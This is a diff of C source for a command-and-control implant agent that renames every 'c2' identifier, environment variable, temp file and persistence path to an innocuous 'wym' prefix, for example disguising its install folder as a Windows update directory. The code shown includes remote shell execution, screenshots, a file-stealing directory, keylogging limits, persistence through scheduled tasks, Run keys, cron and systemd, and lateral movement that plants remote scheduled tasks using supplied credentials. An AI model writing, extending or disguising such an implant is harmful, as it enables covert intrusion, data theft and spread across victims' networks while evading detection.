@@ -14,14 +14,14 @@
  *       --interval 5 --jitter 2 --verbose
  *
  * Environment variables (accepted when the flag is not given):
- *   C2_SERVER, C2_TOKEN, C2_INTERVAL, C2_JITTER, C2_STATE_FILE, C2_VERBOSE
+ *   WYM_SERVER, WYM_TOKEN, WYM_INTERVAL, WYM_JITTER, WYM_STATE_FILE, WYM_VERBOSE
  *
  * Flags:
- *   --server URL      server base URL (required unless C2_SERVER is set)
- *   --token TOKEN     shared agent token (required unless C2_TOKEN is set)
+ *   --server URL      server base URL (required unless WYM_SERVER is set)
+ *   --token TOKEN     shared agent token (required unless WYM_TOKEN is set)
  *   --interval N      heartbeat interval in seconds (default 10, min 1)
  *   --jitter N        random jitter in seconds added to the interval
- *   --state FILE      state file persisting the agent id (default ~/.c2agent_c.json)
+ *   --state FILE      state file persisting the agent id (default ~/.wymagent_c.json)
  *   --verbose         print activity to stdout
  *   -h, --help        show this help and exit
  *
@@ -68,7 +68,7 @@
 #define SHELL_TIMEOUT   120
 #define OUTPUT_LIMIT    12000
 #define MAX_RESPONSE    (1024 * 1024)
-#define STATE_FILENAME  ".c2agent_c.json"
+#define STATE_FILENAME  ".wymagent_c.json"
 #define KEYLOG_LIMIT    32768
 
 /* ---------------------------------------------------------------- globals */
@@ -251,11 +251,11 @@ static int json_find_string(const char *json, const char *key, char *val, size_t
 /* ---------------------------------------------------------------- curl helpers */
 
 /* libcurl verifies TLS certificates by default. Operators using self-signed
- * test certificates can suppress that explicitly with C2_INSECURE_TLS=1. */
+ * test certificates can suppress that explicitly with WYM_INSECURE_TLS=1. */
 static long tls_no_verify(void) {
-    const char *e = getenv("C2_INSECURE_TLS");
+    const char *e = getenv("WYM_INSECURE_TLS");
     if (e && (strcmp(e, "1") == 0 || strcmp(e, "true") == 0 || strcmp(e, "yes") == 0)) {
-        logmsg("TLS certificate verification disabled via C2_INSECURE_TLS=1");
+        logmsg("TLS certificate verification disabled via WYM_INSECURE_TLS=1");
         return 0L;
     }
     return 1L;
@@ -557,8 +557,8 @@ static int run_shell(const char *command, int timeout, char *output, size_t out_
     GetTempPathA(sizeof(tmpdir), tmpdir);
     DWORD self_pid = GetCurrentProcessId();
     char bat[MAX_PATH], outpath[MAX_PATH];
-    snprintf(bat, sizeof(bat), "%sc2run_%lu.cmd", tmpdir, (unsigned long)self_pid);
-    snprintf(outpath, sizeof(outpath), "%sc2run_%lu.out", tmpdir, (unsigned long)self_pid);
+    snprintf(bat, sizeof(bat), "%swymrun_%lu.cmd", tmpdir, (unsigned long)self_pid);
+    snprintf(outpath, sizeof(outpath), "%swymrun_%lu.out", tmpdir, (unsigned long)self_pid);
 
     FILE *bf = fopen(bat, "w");
     if (!bf) {
@@ -853,9 +853,9 @@ static void task_screenshot(const char *task_id, const char *args_json, char *ou
 #ifdef _WIN32
     const char *tmpdir = getenv("TEMP");
     if (!tmpdir) tmpdir = ".";
-    snprintf(tmp, sizeof(tmp), "%s\\c2shot_%d.png", tmpdir, (int)getpid());
+    snprintf(tmp, sizeof(tmp), "%s\\wymshot_%d.png", tmpdir, (int)getpid());
 #else
-    snprintf(tmp, sizeof(tmp), "/tmp/c2shot_%d.png", (int)getpid());
+    snprintf(tmp, sizeof(tmp), "/tmp/wymshot_%d.png", (int)getpid());
 #endif
 
 #ifdef _WIN32
@@ -1423,7 +1423,7 @@ static int make_steal_dir(char *out, size_t n) {
     if (!base || !base[0]) base = "/tmp";
 #endif
     for (int attempt = 0; attempt < 64; attempt++) {
-        snprintf(out, n, "%s%cc2steal_%ld_%d",
+        snprintf(out, n, "%s%cwymsteal_%ld_%d",
                  base, PATH_SEP, (long)getpid(), rand() % 1000000);
         struct stat st;
         if (stat(out, &st) == 0) continue; /* collision, retry */
@@ -2191,13 +2191,13 @@ static void task_persistence(const char *args_json, char *output, size_t out_siz
     const char *appdata = getenv("APPDATA");
     if (!appdata || !appdata[0]) appdata = getenv("USERPROFILE");
     if (!appdata || !appdata[0]) appdata = ".";
-    snprintf(destdir, sizeof(destdir), "%s\\Microsoft\\Windows\\c2update", appdata);
+    snprintf(destdir, sizeof(destdir), "%s\\Microsoft\\Windows\\wymupdate", appdata);
     mkdirs(destdir);
-    snprintf(dest, sizeof(dest), "%s\\c2agent.exe", destdir);
+    snprintf(dest, sizeof(dest), "%s\\wymagent.exe", destdir);
 #else
     const char *home = getenv("HOME");
     if (!home || !home[0]) home = ".";
-    snprintf(destdir, sizeof(destdir), "%s/.config/c2update", home);
+    snprintf(destdir, sizeof(destdir), "%s/.config/wymupdate", home);
     mkdirs(destdir);
     snprintf(dest, sizeof(dest), "%s/%s", destdir, path_base(self));
 #endif
@@ -2217,9 +2217,9 @@ static void task_persistence(const char *args_json, char *output, size_t out_siz
     if (!progdata || !progdata[0]) progdata = getenv("ALLUSERSPROFILE");
     if (!progdata || !progdata[0]) progdata = "C:\\ProgramData";
     char launchdir[1024], launcher[1024];
-    snprintf(launchdir, sizeof(launchdir), "%s\\c2update", progdata);
+    snprintf(launchdir, sizeof(launchdir), "%s\\wymupdate", progdata);
     mkdirs(launchdir);
-    snprintf(launcher, sizeof(launcher), "%s\\c2relaunch.cmd", launchdir);
+    snprintf(launcher, sizeof(launcher), "%s\\wymrelaunch.cmd", launchdir);
     FILE *lf = fopen(launcher, "w");
     if (!lf) {
         snprintf(output, out_size, "persistence error: could not write launcher: %s", launcher);
@@ -2230,7 +2230,7 @@ static void task_persistence(const char *args_json, char *output, size_t out_siz
     out_append(output, out_size, "\npersistence: wrote launcher %s", launcher);
 
     snprintf(cmd, sizeof(cmd),
-             "schtasks /Create /TN \"c2agent-persist\" /TR \"%s\" /SC ONLOGON /RL HIGHEST /F",
+             "schtasks /Create /TN \"wymagent-persist\" /TR \"%s\" /SC ONLOGON /RL HIGHEST /F",
              launcher);
     int rc = run_shell(cmd, 60, sh, sizeof(sh));
     if (rc == 0) {
@@ -2238,29 +2238,29 @@ static void task_persistence(const char *args_json, char *output, size_t out_siz
     } else {
         out_append(output, out_size, "\n  schtasks err: %s", sh);
         snprintf(cmd, sizeof(cmd),
-                 "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v c2agent /t REG_SZ /d %s /f",
+                 "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v wymagent /t REG_SZ /d %s /f",
                  launcher);
-        int rc2 = run_shell(cmd, 60, sh, sizeof(sh));
-        if (rc2 == 0) ok = 1;
+        int rwym = run_shell(cmd, 60, sh, sizeof(sh));
+        if (rwym == 0) ok = 1;
         else out_append(output, out_size, "\n  reg err: %s", sh);
     }
     out_append(output, out_size, "\n  %s",
                ok ? "launch hook registered (schtasks)" : "no launch hook registered");
     *exit_code = ok ? 0 : 1;
 #else
-    snprintf(line, sizeof(line), "@reboot %s # c2agent-persist", relaunch);
+    snprintf(line, sizeof(line), "@reboot %s # wymagent-persist", relaunch);
     snprintf(cmd, sizeof(cmd),
-             "(crontab -l 2>/dev/null | grep -v 'c2agent-persist'; echo \"%s\") | crontab -",
+             "(crontab -l 2>/dev/null | grep -v 'wymagent-persist'; echo \"%s\") | crontab -",
              line);
     int ok_cron = (run_shell(cmd, 60, sh, sizeof(sh)) == 0);
     if (!ok_cron) out_append(output, out_size, "\n  crontab err: %s", sh);
 
     int ok_sys = 0;
-    snprintf(unit, sizeof(unit), "%s/c2-update.service", destdir);
+    snprintf(unit, sizeof(unit), "%s/wym-update.service", destdir);
     FILE *uf = fopen(unit, "w");
     if (uf) {
         fprintf(uf, "[Unit]\n"
-                    "Description=c2 agent update\n\n"
+                    "Description=wym agent update\n\n"
                     "[Service]\n"
                     "Type=simple\n"
                     "ExecStart=/bin/sh -c \"%s\"\n"
@@ -2374,8 +2374,8 @@ static void task_lateral(const char *args_json, char *output, size_t out_size, i
     json_find_string(args_json, "subnet", subnet, sizeof(subnet));
     json_find_string(args_json, "user", user, sizeof(user));
     json_find_string(args_json, "pass", pass, sizeof(pass));
-    const char *eu = getenv("C2_LAT_USER");
-    const char *ep = getenv("C2_LAT_PASS");
+    const char *eu = getenv("WYM_LAT_USER");
+    const char *ep = getenv("WYM_LAT_PASS");
     if (!user[0] && eu) snprintf(user, sizeof(user), "%s", eu);
     if (!pass[0] && ep) snprintf(pass, sizeof(pass), "%s", ep);
 
@@ -2431,7 +2431,7 @@ static void task_lateral(const char *args_json, char *output, size_t out_size, i
         char status[512] = "";
         if (!user[0] || !pass[0]) {
             snprintf(status, sizeof(status),
-                     "skipped (no credentials; set C2_LAT_USER/C2_LAT_PASS)");
+                     "skipped (no credentials; set WYM_LAT_USER/WYM_LAT_PASS)");
             skipped++;
             out_append(output, out_size, "\n  %s: %s", host, status);
             continue;
@@ -2458,11 +2458,11 @@ static void task_lateral(const char *args_json, char *output, size_t out_size, i
                     failed++;
                 } else {
                     snprintf(cmd, sizeof(cmd),
-                             "schtasks /Create /S %s /TN \"c2agent-lateral\" /TR \"%s\" /SC ONLOGON /RU %s /RP %s /RL HIGHEST /F",
+                             "schtasks /Create /S %s /TN \"wymagent-lateral\" /TR \"%s\" /SC ONLOGON /RU %s /RP %s /RL HIGHEST /F",
                              host, relaunch, user, pass);
                     if (run_shell(cmd, 30, rbuf, sizeof(rbuf)) == 0) {
                         snprintf(status, sizeof(status),
-                                 "deployed (file dropped + scheduled c2agent-lateral)");
+                                 "deployed (file dropped + scheduled wymagent-lateral)");
                     } else {
                         err_line(rbuf, errbuf, sizeof(errbuf));
                         snprintf(status, sizeof(status), "deployed (file dropped; task: %s)", errbuf);
@@ -2551,24 +2551,24 @@ int main(int argc, char *argv[]) {
     if (help) {
         printf("usage: ./agent --server URL --token TOKEN [--interval N] [--jitter N] [--state FILE] [--verbose]\n");
         printf("\n");
-        printf("Flags (also settable via C2_SERVER/C2_TOKEN/C2_INTERVAL/C2_JITTER/C2_STATE_FILE/C2_VERBOSE):\n");
-        printf("  --server URL      server base URL (required unless C2_SERVER is set)\n");
-        printf("  --token TOKEN     shared agent token (required unless C2_TOKEN is set)\n");
+        printf("Flags (also settable via WYM_SERVER/WYM_TOKEN/WYM_INTERVAL/WYM_JITTER/WYM_STATE_FILE/WYM_VERBOSE):\n");
+        printf("  --server URL      server base URL (required unless WYM_SERVER is set)\n");
+        printf("  --token TOKEN     shared agent token (required unless WYM_TOKEN is set)\n");
         printf("  --interval N      heartbeat interval in seconds (default 10, min 1)\n");
         printf("  --jitter N        random jitter in seconds added to the interval\n");
-        printf("  --state FILE      state file persisting the agent id (default ~/.c2agent_c.json)\n");
+        printf("  --state FILE      state file persisting the agent id (default ~/.wymagent_c.json)\n");
         printf("  --verbose         print activity to stdout\n");
         printf("  -h, --help        show this help and exit\n");
         return 0;
     }
 
     /* Env var fallback */
-    if (!g_server[0]) { char *e = getenv("C2_SERVER"); if (e) strncpy(g_server, e, sizeof(g_server) - 1); }
-    if (!g_token[0])  { char *e = getenv("C2_TOKEN");  if (e) strncpy(g_token, e, sizeof(g_token) - 1); }
-    if (!interval_given) { char *e = getenv("C2_INTERVAL"); if (e && *e) g_interval = atoi(e); }
-    if (!jitter_given)   { char *e = getenv("C2_JITTER");   if (e && *e) g_jitter = atoi(e); }
-    if (!state_given)    { char *e = getenv("C2_STATE_FILE"); if (e) strncpy(g_state_override, e, sizeof(g_state_override) - 1); }
-    if (!verbose_given) { char *e = getenv("C2_VERBOSE"); if (e && (strcmp(e, "1") == 0 || strcmp(e, "true") == 0)) g_verbose = 1; }
+    if (!g_server[0]) { char *e = getenv("WYM_SERVER"); if (e) strncpy(g_server, e, sizeof(g_server) - 1); }
+    if (!g_token[0])  { char *e = getenv("WYM_TOKEN");  if (e) strncpy(g_token, e, sizeof(g_token) - 1); }
+    if (!interval_given) { char *e = getenv("WYM_INTERVAL"); if (e && *e) g_interval = atoi(e); }
+    if (!jitter_given)   { char *e = getenv("WYM_JITTER");   if (e && *e) g_jitter = atoi(e); }
+    if (!state_given)    { char *e = getenv("WYM_STATE_FILE"); if (e) strncpy(g_state_override, e, sizeof(g_state_override) - 1); }
+    if (!verbose_given) { char *e = getenv("WYM_VERBOSE"); if (e && (strcmp(e, "1") == 0 || strcmp(e, "true") == 0)) g_verbose = 1; }
 
     if (!g_server[0] || !g_token[0]) {
         fprintf(stderr, "usage: ./agent --server URL --token TOKEN [--interval N] [--jitter N] [--state FILE] [--verbose]\n");
